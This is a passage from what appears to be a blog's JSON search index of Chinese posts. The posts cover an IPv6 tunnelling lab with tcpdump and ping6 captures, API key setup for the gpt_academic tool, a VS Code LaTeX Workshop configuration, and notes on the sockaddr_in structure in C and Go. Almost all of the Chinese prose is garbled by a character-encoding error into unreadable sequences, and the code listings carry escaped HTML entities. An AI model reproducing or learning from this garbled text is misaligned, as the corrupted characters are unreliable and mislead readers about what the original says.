çš„è¿™ä¸¤ä¸ªç»ˆç«¯å¹¶é‡æ–°æ‰“å¼€ä¸¤ä¸ªæ–°çš„ç»ˆç«¯ã€‚\nåœ¨ HostA çš„ç¬¬ 1 ä¸ªç»ˆç«¯ä¸­æ‰§è¡Œå‘½ä»¤ sudo tcpdump -vxn â€“i ens5\nåœ¨ HostA çš„ç¬¬ 2 ä¸ªç»ˆç«¯ä¸­æ‰§è¡Œå‘½ä»¤ ping6 â€“c 1 3ffe:3216:2101:2106:1234::Bã€‚ è®°å½• HostA çš„ç¬¬ 1 ä¸ªç»ˆç«¯ä¸­ç”± tcpdump æŠ“å–çš„å‰ä¸¤ä¸ªæŠ¥æ–‡ï¼ˆå¯èƒ½è¦ç­‰ä¸€ä¼šå„¿ï¼‰ã€‚ å‘½ä»¤è§£é‡Š sudo tcpdump -vxn -i sit1 ç”¨äºæ•è·åœ¨éš§é“æ¥å£ sit1 ä¸Šä¼ è¾“çš„ç½‘ç»œæ•°æ®åŒ…ã€‚\nping6 â€“c 1 3ffe:3216:2101:2106:1234::Bè¯¥å‘½ä»¤å°†å‘ IPv6 åœ°å€ 3ffe:3216:2101:2106:1234::B å‘é€ä¸€ä¸ª ICMP å›æ˜¾è¯·æ±‚æ•°æ®åŒ…ã€‚å¦‚æœè¯¥åœ°å€å¯è¾¾ï¼Œåˆ™ç›®æ ‡ä¸»æœºå°†ä¼šå“åº”ä¸€ä¸ª ICMP å›æ˜¾åº”ç­”æ•°æ®åŒ…ã€‚\nç»“æœè§£é‡Š ã€å®éªŒè¦æ±‚ã€‘ï¼šè®°å½•éœ€è¦è®°å½•çš„å®éªŒæ•°æ®ã€‚ä»æŠ¥æ–‡ç»“æ„ä¸Šçœ‹ï¼Œé€šè¿‡éš§é“é€šä¿¡ä¸ä¸¤ä¸ª IPv6 ä¸»æœºç›´æ¥é€šä¿¡çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Œå³ä¸Šè¿°éš§é“é€šä¿¡çš„æŠ¥æ–‡æœ‰ä»€ä¹ˆç‰¹ç‚¹ï¼Ÿ\né€šè¿‡éš§é“é€šä¿¡ä¸ä¸¤ä¸ª IPv6 ä¸»æœºç›´æ¥é€šä¿¡çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼š\néš§é“é€šä¿¡çš„æŠ¥æ–‡ä¸­ï¼ŒIPv6 å¤´éƒ¨åŒ…å«äº†æºåœ°å€å’Œç›®æ ‡åœ°å€ï¼Œä»¥åŠéš§é“åè®®ç±»å‹ã€‚ä¸¤ä¸ª IPv6 ä¸»æœºç›´æ¥é€šä¿¡çš„æŠ¥æ–‡ä¸­ï¼ŒIPv6 å¤´éƒ¨åªåŒ…å«äº†æºåœ°å€å’Œç›®æ ‡åœ°å€ã€‚ éš§é“é€šä¿¡çš„æŠ¥æ–‡ä¸­ï¼ŒåŒ…å«äº†éš§é“åè®®å¤´éƒ¨ï¼Œç”¨äºæè¿°éš§é“è¿æ¥çš„ç›¸å…³ä¿¡æ¯ã€‚ä¸¤ä¸ª IPv6 ä¸»æœºç›´æ¥é€šä¿¡çš„æŠ¥æ–‡ä¸­ï¼Œæ²¡æœ‰éš§é“åè®®å¤´éƒ¨ã€‚ ","date":"2023-11-20T10:27:05+08:00","permalink":"https://anonymity-0.github.io/posts/%E4%BF%A1%E7%BD%91%E5%AE%9E%E9%AA%8C2/","title":"ä¿¡ç½‘å®éªŒ2"},{"content":"é¡¹ç›®åœ°å€ GitHub - binary-husky/gpt_academic: ä¸ºChatGPT/GLMæä¾›å®ç”¨åŒ–äº¤äº’ç•Œé¢ï¼Œç‰¹åˆ«ä¼˜åŒ–è®ºæ–‡é˜…è¯»/æ¶¦è‰²/å†™ä½œä½“éªŒï¼Œæ¨¡å—åŒ–è®¾è®¡ï¼Œæ”¯æŒè‡ªå®šä¹‰å¿«æ·æŒ‰é’®\u0026amp;å‡½æ•°æ’ä»¶ï¼Œæ”¯æŒPythonå’ŒC++ç­‰é¡¹ç›®å‰–æ\u0026amp;è‡ªè¯‘è§£åŠŸèƒ½ï¼ŒPDF/LaTexè®ºæ–‡ç¿»è¯‘\u0026amp;æ€»ç»“åŠŸèƒ½ï¼Œæ”¯æŒå¹¶è¡Œé—®è¯¢å¤šç§LLMæ¨¡å‹ï¼Œæ”¯æŒchatglm2ç­‰æœ¬åœ°æ¨¡å‹ã€‚å…¼å®¹æ–‡å¿ƒä¸€è¨€, moss, llama2, rwkv, claude2, é€šä¹‰åƒé—®, ä¹¦ç”Ÿ, è®¯é£æ˜Ÿç«ç­‰ã€‚\napié…ç½® openai-api å› ä¸ºå·²ç»æœ‰äº†gptè´¦æˆ·ï¼Œæ‰€ä»¥ç›´æ¥åœ¨OpenAI Platformä¸Šç”Ÿæˆä¸€ä¸ªkeyå°±å¯ä»¥äº†ã€‚æ³¨æ„è¿™ä¸ªkeyåªèƒ½çœ‹ä¸€æ¬¡ã€‚ azure-api æ³¨å†Œ å› ä¸ºæ³¨å†Œazureæœ¬èº«éœ€è¦ä¿¡ç”¨å¡ï¼Œæœ¬æ¥ä¸æƒ³æ³¨å†Œçš„ï¼Œçªç„¶çœ‹åˆ°ä¸€ä¸ªåšå®¢è¯´azureå­¦ç”Ÿè®¤è¯ä¹‹åå¯ä»¥ä¸éœ€è¦ä¿¡ç”¨å¡ï¼Œè¯•äº†ä¸€ä¸‹æœç„¶å¯ä»¥ã€‚æ³¨å†Œä¹‹åç§’é€šè¿‡ï¼Œç§‘å¤§é‚®ç®±è¿˜æ˜¯é è°±çš„ã€‚ æ³¨å†Œå¯ä»¥å‚è€ƒå­¦ç”Ÿç¦åˆ©ç™½å«–ä¹‹è·¯â€”â€”ç”³è¯·Azureå­¦ç”Ÿè®¢é˜… - çŸ¥ä¹\né…ç½® åœ¨æœç´¢æ æœç´¢Openaiï¼Œç„¶ååˆ›å»º è¯·æ±‚è®¿é—®Azure OpenAIæœåŠ¡ ç„¶åå¡«å†™é—®å·ï¼Œç¬¬å››ä¸ªé—®é¢˜éœ€è¦å¡«å†™è®¢é˜…IDï¼Œ å‚è€ƒï¼š è·å– Azure é—¨æˆ·ä¸­çš„è®¢é˜…å’Œç§Ÿæˆ· ID - Azure portal | Microsoft Learn\nå¡«å®Œé—®å·ä¹‹åè¦ç­‰ä¸€æ®µæ—¶é—´çš„å®¡æ ¸ æ˜Ÿç«api ç™»é™†ï¼šè®¯é£å¼€æ”¾å¹³å° ç‚¹å‡»å…è´¹è¯•ç”¨ï¼š å®åè®¤è¯è·å¾—æ›´å¤štoken å‰å¾€æ§åˆ¶å°-è®¯é£å¼€æ”¾å¹³å°è·å–è‡ªå·±çš„key è¾“å…¥åˆ°config.pyä¸­ æ³¨ï¼šéœ€åœ¨è¿™ä¸ªåˆ—è¡¨æ·»åŠ  æ™ºè°±æ¸…è¨€ å‰å¾€å¹³å°æ™ºè°±AIå¼€æ”¾å¹³å°ç™»é™†åå‰å¾€ ç‚¹å‡»å³ä¸Šè§’æŸ¥çœ‹apikey å¤åˆ¶keyè¾“å…¥config.pyçš„è¿™ä¸ªéƒ¨åˆ†ï¼š å…¶ä»–apiä¸æ˜¯éœ€è¦è‡ªå·±éƒ¨ç½²å°±æ˜¯æ”¶è´¹ï¼Œå°±ä¸æ£é¼“äº†ã€‚\n","date":"2023-11-18T17:09:33+08:00","permalink":"https://anonymity-0.github.io/posts/gpt-academic%E6%9C%AC%E5%9C%B0%E9%85%8D%E7%BD%AE/","title":"Gpt Academicæœ¬åœ°é…ç½®"},{"content":"æœ€è¿‘å¼€å§‹è¦å†™è¯¾ç¨‹è®ºæ–‡äº†ï¼Œæƒ³ç€è¦ç”¨latexçš„æ¨¡æ¿ç›´æ¥å†™ä¼šæ–¹ä¾¿ï¼Œåˆæ‡’å¾—ä¸‹overleafï¼Œè¯ä¸å¤šè¯´å¼€å§‹é…ç½®\nä¸‹è½½ä¸å®‰è£… å¯ä»¥ä»è¯¥é•œåƒä¸‹è½½ [Index of CTAN-local/systems/texlive/Images](https://mirrors.huaweicloud.com/CTAN/systems/texlive/Images/\nmacç”¨æˆ·å¯é…ç½®MacTeX - TeX Users Group\nå®‰è£…vscodeæ’ä»¶ LaTeX Workshop\né…ç½® é…ç½®latex-workshop ä¸åŒ…å«å¤–éƒ¨ pdf æŸ¥çœ‹å™¨è®¾ç½®çš„é…ç½®\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 \u0026#34;latex-workshop.latex.autoBuild.run\u0026#34;: \u0026#34;never\u0026#34;, \u0026#34;latex-workshop.showContextMenu\u0026#34;: true, \u0026#34;latex-workshop.intellisense.package.enabled\u0026#34;: true, \u0026#34;latex-workshop.message.error.show\u0026#34;: false, \u0026#34;latex-workshop.message.warning.show\u0026#34;: false, \u0026#34;latex-workshop.latex.tools\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;xelatex\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;xelatex\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;-synctex=1\u0026#34;, \u0026#34;-interaction=nonstopmode\u0026#34;, \u0026#34;-file-line-error\u0026#34;, \u0026#34;%DOCFILE%\u0026#34; ] }, { \u0026#34;name\u0026#34;: \u0026#34;pdflatex\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;pdflatex\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;-synctex=1\u0026#34;, \u0026#34;-interaction=nonstopmode\u0026#34;, \u0026#34;-file-line-error\u0026#34;, \u0026#34;%DOCFILE%\u0026#34; ] }, { \u0026#34;name\u0026#34;: \u0026#34;latexmk\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;latexmk\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;-synctex=1\u0026#34;, \u0026#34;-interaction=nonstopmode\u0026#34;, \u0026#34;-file-line-error\u0026#34;, \u0026#34;-pdf\u0026#34;, \u0026#34;-outdir=%OUTDIR%\u0026#34;, \u0026#34;%DOCFILE%\u0026#34; ] }, { \u0026#34;name\u0026#34;: \u0026#34;bibtex\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;bibtex\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;%DOCFILE%\u0026#34; ] } ], \u0026#34;latex-workshop.latex.recipes\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;XeLaTeX\u0026#34;, \u0026#34;tools\u0026#34;: [ \u0026#34;xelatex\u0026#34; ] }, { \u0026#34;name\u0026#34;: \u0026#34;PDFLaTeX\u0026#34;, \u0026#34;tools\u0026#34;: [ \u0026#34;pdflatex\u0026#34; ] }, { \u0026#34;name\u0026#34;: \u0026#34;BibTeX\u0026#34;, \u0026#34;tools\u0026#34;: [ \u0026#34;bibtex\u0026#34; ] }, { \u0026#34;name\u0026#34;: \u0026#34;LaTeXmk\u0026#34;, \u0026#34;tools\u0026#34;: [ \u0026#34;latexmk\u0026#34; ] }, { \u0026#34;name\u0026#34;: \u0026#34;xelatex -\u0026gt; bibtex -\u0026gt; xelatex*2\u0026#34;, \u0026#34;tools\u0026#34;: [ \u0026#34;xelatex\u0026#34;, \u0026#34;bibtex\u0026#34;, \u0026#34;xelatex\u0026#34;, \u0026#34;xelatex\u0026#34; ] }, { \u0026#34;name\u0026#34;: \u0026#34;pdflatex -\u0026gt; bibtex -\u0026gt; pdflatex*2\u0026#34;, \u0026#34;tools\u0026#34;: [ \u0026#34;pdflatex\u0026#34;, \u0026#34;bibtex\u0026#34;, \u0026#34;pdflatex\u0026#34;, \u0026#34;pdflatex\u0026#34; ] }, ], \u0026#34;latex-workshop.latex.clean.fileTypes\u0026#34;: [ \u0026#34;*.aux\u0026#34;, \u0026#34;*.bbl\u0026#34;, \u0026#34;*.blg\u0026#34;, \u0026#34;*.idx\u0026#34;, \u0026#34;*.ind\u0026#34;, \u0026#34;*.lof\u0026#34;, \u0026#34;*.lot\u0026#34;, \u0026#34;*.out\u0026#34;, \u0026#34;*.toc\u0026#34;, \u0026#34;*.acn\u0026#34;, \u0026#34;*.acr\u0026#34;, \u0026#34;*.alg\u0026#34;, \u0026#34;*.glg\u0026#34;, \u0026#34;*.glo\u0026#34;, \u0026#34;*.gls\u0026#34;, \u0026#34;*.ist\u0026#34;, \u0026#34;*.fls\u0026#34;, \u0026#34;*.log\u0026#34;, \u0026#34;*.fdb_latexmk\u0026#34; ], \u0026#34;latex-workshop.latex.autoClean.run\u0026#34;: \u0026#34;onFailed\u0026#34;, \u0026#34;latex-workshop.latex.recipe.default\u0026#34;: \u0026#34;lastUsed\u0026#34;, \u0026#34;latex-workshop.view.pdf.internal.synctex.keybinding\u0026#34;: \u0026#34;double-click\u0026#34; SumatraPDF å®‰è£…è®¾ç½® å› ä¸ºvscodeå†…ç½®çš„pdfæŸ¥çœ‹å™¨ä¸å¤ªå¥½ç”¨ï¼Œå¯ä»¥é…ç½®åˆ«çš„pdfæŸ¥çœ‹å™¨ã€‚å…·ä½“é…ç½®å‚è€ƒVisual Studio Code (vscode)é…ç½®LaTeX - çŸ¥ä¹\nå¸¸ç”¨latexæ¨¡æ¿ ç§‘å¤§å­¦ä½è®ºæ–‡æ¨¡æ¿ï¼šGitHub - ustctug/ustcthesis: LaTeX template for USTC thesis å›½ç§‘å¤§å­¦ä½è®ºæ–‡æ¨¡æ¿ï¼šGitHub - mohuangrui/ucasthesis: LaTeX Thesis Template for the University of Chinese Academy of Sciences å›½ç§‘å¤§å¤§ä½œä¸šè®ºæ–‡æ¨¡æ¿ï¼šGitHub - jweihe/UCAS_Latex_Template: ä¸­å›½ç§‘å­¦é™¢å¤§å­¦é€šç”¨è¯¾ç¨‹å¤§ä½œä¸šæ¨¡æ¿ ","date":"2023-11-15T21:32:47+08:00","permalink":"https://anonymity-0.github.io/posts/vscode%E9%85%8D%E7%BD%AElatex/","title":"VScodeé…ç½®Latex"},{"content":"3.1 åˆ†é…ç»™å¥—æ¥å­—çš„IPåœ°å€ä¸ç«¯å£å· ç½‘ç»œåœ°å€ ç•¥\nç”¨äºåŒºåˆ†å¥—æ¥å­—çš„ç«¯å£å· IPç”¨äºåŒºåˆ†è®¡ç®—æœº,åªè¦æœ‰IPåœ°å€å°±èƒ½å‘ç›®æ ‡ä¸»æœºä¼ è¾“æ•°æ®,ä½†ä»…å‡­è¿™äº›æ— æ³•ä¼ è¾“ç»™æœ€ç»ˆçš„åº”ç”¨ç¨‹åºã€‚å‡è®¾å„ä½æ¬£èµè§†é¢‘çš„åŒæ—¶åœ¨ç½‘ä¸Šå†²æµª,è¿™æ—¶è‡³å°‘éœ€è¦1ä¸ªæ¥æ”¶è§†é¢‘æ•°æ®çš„å¥—æ¥å­—å’Œ1 ä¸ªæ¥æ”¶ç½‘é¡µä¿¡æ¯çš„å¥—æ¥å­—ã€‚é—®é¢˜åœ¨äºå¦‚ä½•åŒºåˆ†äºŒè€…ã€‚ç®€è¨€ä¹‹,ä¼ è¾“åˆ°è®¡ç®—æœºçš„ç½‘ç»œæ•°æ®æ˜¯å‘ç»™æ’­æ”¾å™¨,è¿˜æ˜¯å‘é€ç»™æµè§ˆå™¨?\nè‹¥æƒ³æ¥æ”¶å¤šå°è®¡ç®—æœºå‘æ¥çš„æ•°æ®,åˆ™éœ€è¦ç›¸åº”ä¸ªæ•°çš„å¥—æ¥å­—ã€‚é‚£å¦‚ä½•åŒºåˆ†è¿™äº›å¥—æ¥å­—å‘¢? è®¡ç®—æœºä¸­ä¸€èˆ¬é…æœ‰NIC(Network Interface Card,ç½‘ç»œæ¥å£å¡)æ•°æ®ä¼ è¾“è®¾å¤‡ã€‚é€šè¿‡NICå‘è®¡ç®—æœºå†…éƒ¨ä¼ è¾“æ•°æ®æ—¶ä¼šç”¨åˆ°IPã€‚æ“ä½œç³»ç»Ÿè´Ÿè´£æŠŠä¼ é€’åˆ°å†…éƒ¨çš„æ•°æ®é€‚å½“åˆ†é…ç»™å¥—æ¥å­—,åˆ©ç”¨ç«¯å£å·ã€‚ä¹Ÿå°±æ˜¯è¯´,é€šè¿‡NICæ¥æ”¶çš„æ•°æ®å†…æœ‰ç«¯å£å·,æ“ä½œç³»ç»Ÿæ­£æ˜¯å‚è€ƒæ­¤ç«¯å£å·æŠŠæ•°æ®ä¼ è¾“ç»™ç›¸åº”ç«¯å£çš„å¥—æ¥å­— ç«¯å£å·å°±æ˜¯åœ¨åŒä¸€æ“ä½œç³»ç»Ÿå†…ä¸ºåŒºåˆ†ä¸åŒå¥—æ¥å­—è€Œè®¾ç½®çš„,å› æ­¤æ— æ³•å°†1ä¸ªç«¯å£å·åˆ†é…ç»™ä¸åŒå¥—æ¥å­—ã€‚ å¦å¤–,ç«¯å£å·ç”±16ä½æ„æˆ å¯åˆ†é…çš„ç«¯å£å·èŒƒå›´æ˜¯0-65535ã€‚ä½†0-1023æ˜¯çŸ¥åç«¯å£(Well-known PORT),ä¸€èˆ¬åˆ†é…ç»™ç‰¹å®šåº”ç”¨ç¨‹åº,æ‰€ä»¥åº”å½“åˆ†é…æ­¤èŒƒå›´ä¹‹å¤–çš„å€¼ã€‚å¦å¤–,è™½ç„¶ç«¯å£å·ä¸èƒ½é‡å¤,ä½†TCPå¥—æ¥å­—å’ŒUDPå¥—æ¥å­—ä¸ä¼šå…±ç”¨ç«¯å£å·,æ‰€ä»¥å…è®¸é‡å¤ã€‚ä¾‹å¦‚:å¦‚æœæŸTCP å¥—æ¥å­—ä½¿ç”¨9190å·ç«¯å£,åˆ™å…¶ä»–TCPå¥—æ¥å­—å°±æ— æ³•ä½¿ç”¨è¯¥ç«¯å£å·,ä½†UDPå¥—æ¥å­—å¯ä»¥ä½¿ç”¨ã€‚ æ€»ä¹‹,æ•°æ®ä¼ è¾“ç›®æ ‡åœ°å€åŒæ—¶åŒ…å«IPåœ°å€å’Œç«¯å£å·,åªæœ‰è¿™æ ·,æ•°æ®æ‰ä¼šè¢«ä¼ è¾“åˆ°æœ€ç»ˆçš„ç›®çš„åº”ç”¨ç¨‹åº(åº”ç”¨ç¨‹åºå¥—æ¥å­—)ã€‚\n3.2 åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨çš„IPåœ°å€å’Œç«¯å£å·ä»¥ç»“æ„ä½“çš„å½¢å¼ç»™å‡ºäº†å®šä¹‰ã€‚æœ¬èŠ‚å°†ä»¥IPv4ä¸ºä¸­å¿ƒ,å›´ç»•æ­¤ç»“æ„ä½“è®¨è®ºç›®æ ‡åœ°å€çš„è¡¨ç¤ºæ–¹æ³•ã€‚\nè¡¨ç¤ºIPv4çš„ç»“æ„ä½“ å¡«å†™åœ°å€ä¿¡æ¯æ—¶åº”ä»¥å¦‚ä¸‹æé—®ä¸ºçº¿ç´¢è¿›è¡Œ\nå£ é—®é¢˜1ï¼šâ€œé‡‡ç”¨å“ªä¸€ç§åœ°å€æ—ï¼Ÿâ€ å£ ç­”æ¡ˆ1ï¼šâ€œåŸºäºIPv4çš„åœ°å€æ—ã€‚â€ å£é—®é¢˜2ï¼šâ€œIPåœ°å€æ˜¯å¤šå°‘ï¼Ÿâ€ å£ç­”æ¡ˆ2ï¼šâ€œ211.204.214.76ã€‚â€ å£ é—®é¢˜3ï¼šâ€œç«¯å£å·æ˜¯å¤šå°‘ï¼Ÿâ€ å£ ç­”æ¡ˆ3ï¼šâ€œ2048ã€‚â€ C Cè¯­è¨€ä¸­IPv4ç»“æ„ä½“å®šä¹‰ä¸ºå¦‚ä¸‹å½¢æ€\n1 2 3 4 5 6 7 struct sockaddr_in { sa_family_t sin_family; //åœ°å€æ— uint16_t sin_port; //16ä½TCP/UDPåœ°å€ struct in_addr sin_addr; //32ä½ipåœ°å€ char sin_zero[8]; //ä¸ä½¿ç”¨ }; in_addrå®šä¹‰å¦‚ä¸‹ï¼Œå®ƒç”¨æ¥å­˜æ”¾32ä½IPåœ°å€\n1 2 3 4 struct in_addr { In_addr_t s_addr; //32ä½IPv4åœ°å€ } å¯ä»¥çœ‹åˆ° in_addr_t å®é™…ä¸Šæ˜¯ uint32_tä¹Ÿå°±æ˜¯æ— ç¬¦å·32ä½bitï¼Œé‚£ä¸ºä»€ä¹ˆéœ€è¦é¢å¤–å®šä¹‰è¿™äº›æ•°æ®ç±»å‹å‘¢? å¦‚å‰æ‰€è¿°,è¿™æ˜¯è€ƒè™‘åˆ°æ‰©å±•æ€§çš„ç»“æœã€‚å¦‚æœä½¿ç”¨int32_tç±»å‹çš„æ•°æ®,å°±èƒ½ä¿è¯åœ¨ä»»ä½•æ—¶å€™éƒ½å ç”¨4å­—èŠ‚,å³ä½¿å°†æ¥ç”¨64ä½è¡¨ç¤ºintç±»å‹ä¹Ÿæ˜¯å¦‚æ­¤ã€‚ ä»ä¹‹å‰ä»‹ç»çš„ä»£ç ä¹Ÿå¯çœ‹å‡º,sockaddr_inç»“æ„ä½“å˜é‡åœ°å€å€¼å°†ä»¥å¦‚ä¸‹æ–¹å¼ä¼ é€’ç»™bindå‡½æ•°ã€‚\n1 2 3 4 5 struct sockaddr_in serv_addr; ... if(bind(serv_sock,(struct sockaddr * ) \u0026amp;serv_addr, sizeof(Serv_addr))== -1) error_handling(\u0026#34;bind()error\u0026#34;); ... æ­¤å¤„é‡è¦çš„æ˜¯ç¬¬äºŒä¸ªå‚æ•°çš„ä¼ é€’ã€‚å®é™…ä¸Š,bindå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°æœŸæœ›å¾—åˆ°sockaddrç»“æ„ä½“å˜é‡åœ°å€å€¼,åŒ…æ‹¬åœ°å€æ—ã€ç«¯å£å·ã€IPåœ°å€ç­‰ã€‚ï¼ˆæ­¤å¤„è¿›è¡Œäº†å¼ºåˆ¶ç±»å‹è½¬æ¢,å°†sockaddr_inè½¬æˆsockaddrï¼‰ä»ä¸‹åˆ—ä»£ç ä¹Ÿå¯çœ‹å‡º,ç›´æ¥å‘sockaddrç»“æ„ä½“å¡«å……è¿™äº›ä¿¡æ¯ä¼šå¸¦æ¥éº»çƒ¦ã€‚\n1 2 3 4 struct sockaddr { sa_family_t char sin_family;//åœ°å€æ—(Address Family) sa_data[14];// åœ°å€ä¿¡æ¯ } æ­¤ç»“æ„ä½“æˆå‘˜sa_dataä¿å­˜çš„åœ°å€ä¿¡æ¯ä¸­éœ€åŒ…å«IPåœ°å€å’Œç«¯å£å·,å‰©ä½™éƒ¨åˆ†åº”å¡«å……0,è¿™ä¹Ÿæ˜¯bindå‡½æ•°è¦æ±‚çš„ã€‚è€Œè¿™å¯¹äºåŒ…å«åœ°å€ä¿¡æ¯æ¥è®²éå¸¸éº»çƒ¦,ç»§è€Œå°±æœ‰äº†æ–°çš„ç»“æ„ä½“sockaddr_inã€‚è‹¥æŒ‰ç…§ä¹‹å‰çš„è®²è§£å¡«å†™sockaddr_inç»“æ„ä½“,åˆ™å°†ç”Ÿæˆç¬¦åˆbindå‡½æ•°è¦æ±‚çš„å­—èŠ‚æµã€‚æœ€åè½¬æ¢ä¸ºsockaddrå‹çš„ç»“æ„ä½“å˜é‡,å†ä¼ é€’ç»™bindå‡½æ•°å³å¯ã€‚\nsin_family æ¯ç§åè®®æ—é€‚ç”¨çš„åœ°å€æ—å‡ä¸åŒã€‚æ¯”å¦‚,IPv4ä½¿ç”¨4å­—èŠ‚åœ°å€æ—,IPv6ä½¿ç”¨16å­—èŠ‚åœ°å€æ—ã€‚ å¯ä»¥å‚è€ƒè¡¨3-2ä¿å­˜sin_familyåœ°å€ä¿¡æ¯ã€‚ sockaddr_inæ˜¯ä¿å­˜IPv4åœ°å€ä¿¡æ¯çš„ç»“æ„ä½“ã€‚é‚£ä¸ºä½•è¿˜éœ€è¦é€šè¿‡sin_familyå•ç‹¬æŒ‡å®šåœ°å€æ—ä¿¡æ¯å‘¢? è¿™ä¸ä¹‹å‰è®²è¿‡çš„sockaddrç»“æ„ä½“æœ‰å…³ã€‚ç»“æ„ä½“sockaddrå¹¶éåªæ¬¡IPv4è®¾è®¡, è¿™ä»ä¿å­˜åœ°å€ä¿¡æ¯çš„æ•°ç»„sa_dataé•¿åº¦ä¸º14å­—èŠ‚ä¹Ÿå¯çœ‹å‡ºã€‚å› æ­¤,ç»“æ„ä½“sockaddrè¦æ±‚åœ¨sin_family ä¸­æŒ‡å®šåœ°å€æ—ä¿¡æ¯ã€‚ä¸ºäº†ä¸sockaddrä¿æŒä¸€è‡´,sockaddr_inç»“æ„ä½“ä¸­ä¹Ÿæœ‰åœ°å€æ—ä¿¡æ¯ã€‚\nsin_port è¯¥æˆå‘˜ä¿å­˜16ä½ç«¯å£å·,é‡ç‚¹åœ¨äº,å®ƒä»¥ç½‘ç»œå­—èŠ‚åºä¿å­˜\nsin_addr è¯¥æˆå‘˜ä¿å­˜32ä½IPåœ°å€ä¿¡æ¯,ä¸”ä¹Ÿä»¥ç½‘ç»œå­—èŠ‚åºä¿å­˜ã€‚ä¸ºç†è§£å¥½è¯¥æˆå‘˜,åº”åŒæ—¶è§‚å¯Ÿç»“æ„ä½“in_addrã€‚ä½†ç»“æ„ä½“in_addrå£°æ˜ä¸ºuint32_t,å› æ­¤åªéœ€å½“ä½œ32ä½æ•´æ•°å‹å³å¯ã€‚\nsin_zero æ— ç‰¹æ®Šå«ä¹‰ã€‚åªæ˜¯ ä½¿ç»“æ„ä½“sockaddr_inçš„å¤§å°ä¸sockaddç»“æ„ä½“ä¿æŒä¸€è‡´è€Œæ’å…¥çš„æˆå‘˜ã€‚ å¿…éœ€å¡«å……ä¸º0,å¦åˆ™æ— æ³•å¾—åˆ°æƒ³è¦çš„ç»“æœã€‚\ngo åœ¨ Go è¯­è¨€ä¸­ï¼Œç±»ä¼¼äº C è¯­è¨€ä¸­Â struct sockaddr_inÂ çš„ç»“æ„ä½“æ˜¯Â syscall.SockaddrInet4ï¼ˆå¯¹äº IPv4ï¼‰å’ŒÂ syscall.SockaddrInet6ï¼ˆå¯¹äº IPv6ï¼‰ã€‚\nåœ¨goä¸­ï¼Œå°±æ²¡æœ‰ç‰¹åˆ«å®šä¹‰in_addr_tï¼Œç›´æ¥ä½¿ç”¨[4]byteã€‚\n1 2 3 4 5 6 // SockaddrInet4 ç»“æ„ä½“ç”¨äºè¡¨ç¤ºä¸€ä¸ª IPv4 ç½‘ç»œåœ°å€ã€‚ type SockaddrInet4 struct { Port int // Port å­—æ®µè¡¨ç¤ºç«¯å£å· Addr [4]byte // Addr å­—æ®µè¡¨ç¤º IPv4 åœ°å€ï¼Œå­˜å‚¨ä¸º 4 å­—èŠ‚ raw RawSockaddrInet4 // raw å­—æ®µæ˜¯å†…éƒ¨ä½¿ç”¨çš„åŸå§‹ç»“æ„ä½“ï¼Œç”¨äºä¸ç³»ç»Ÿè°ƒç”¨äº¤äº’ } Portï¼šä¸€ä¸ªÂ intÂ ç±»å‹çš„å€¼ï¼Œè¡¨ç¤ºç½‘ç»œåœ°å€çš„ç«¯å£å·ã€‚\nAddrï¼šä¸€ä¸ªÂ [4]byteÂ ç±»å‹çš„æ•°ç»„ï¼Œè¡¨ç¤º IPv4 åœ°å€ã€‚æ¯ä¸ªå­—èŠ‚ä»£è¡¨åœ°å€çš„ä¸€éƒ¨åˆ†ï¼Œä¾‹å¦‚ï¼Œåœ°å€ \u0026ldquo;127.0.0.1\u0026rdquo; ä¼šè¢«è¡¨ç¤ºä¸ºÂ [127, 0, 0, 1]ã€‚\nrawï¼šä¸€ä¸ªÂ RawSockaddrInet4Â ç±»å‹çš„å€¼ï¼Œè¡¨ç¤ºç½‘ç»œåœ°å€çš„åº•å±‚è¡¨ç¤ºã€‚è¿™ä¸ªå­—æ®µé€šå¸¸ç”±ç³»ç»Ÿè°ƒç”¨ä½¿ç”¨ï¼Œä¸åº”åœ¨å¸¸è§„ Go ä»£ç ä¸­ç›´æ¥ä½¿ç”¨\nRawSockaddrInet4\n1 2 3 4 5 6 7 8 // RawSockaddrInet4 ç»“æ„ä½“ç”¨äºè¡¨ç¤ºä¸€ä¸ª IPv4 ç½‘ç»œåœ°å€çš„åº•å±‚ç»“æ„ã€‚ type RawSockaddrInet4 struct { Len uint8 // Len å­—æ®µè¡¨ç¤ºæ­¤ç»“æ„ä½“çš„é•¿åº¦ Family uint8 // Family å­—æ®µè¡¨ç¤ºåœ°å€æ—ï¼Œå¯¹äº IPv4ï¼Œæ­¤å€¼é€šå¸¸ä¸º AF_INET Port uint16 // Port å­—æ®µè¡¨ç¤ºç«¯å£å· Addr [4]byte // Addr å­—æ®µè¡¨ç¤º IPv4 åœ°å€ï¼Œå­˜å‚¨ä¸º 4 å­—èŠ‚ Zero [8]int8 // Zero å­—æ®µæ˜¯å¡«å……å­—æ®µï¼Œç”¨äºç¡®ä¿ç»“æ„ä½“çš„å¤§å°æ­£ç¡® } Goè¯­è¨€ä¹Ÿç±»ä¼¼ï¼Œè¿™æ˜¯go çš„bindå‡½æ•°\n1 2 3 4 5 6 7 func Bind(fd int, sa Sockaddr) (err error) { ptr, n, err := sa.sockaddr() if err != nil { return err } return bind(fd, ptr, n) } åœ¨ Go è¯­è¨€ä¸­ï¼Œsyscall.BindÂ å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯Â SockaddrÂ 